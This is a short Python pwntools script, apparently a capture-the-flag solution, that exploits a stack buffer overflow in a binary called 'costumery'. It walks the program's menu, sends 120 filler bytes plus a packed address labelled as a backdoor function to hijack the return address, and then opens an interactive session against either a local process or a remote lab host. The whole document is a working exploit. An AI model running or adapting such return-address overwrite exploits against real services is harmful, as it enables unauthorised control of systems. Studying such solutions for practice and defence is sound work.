#!/usr/bin/env python3

from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64

LOCAL_BIN = "../files/costumery"
LOCAL = True
GDB = False

BIN = ELF(LOCAL_BIN)

if LOCAL:
    P = process(LOCAL_BIN, env={})
else:
    P = remote('10.10.2.10',25565)

rip_offset = 120
backdoor_addr = 0x401951
payload = b"A"*rip_offset + p64(backdoor_addr)
print(P.clean())
P.sendline(b"1")
P.sendline(b"1")
P.sendline(b"yes")
print(P.clean())
P.sendline(payload)
print(P.clean())
P.interactive()
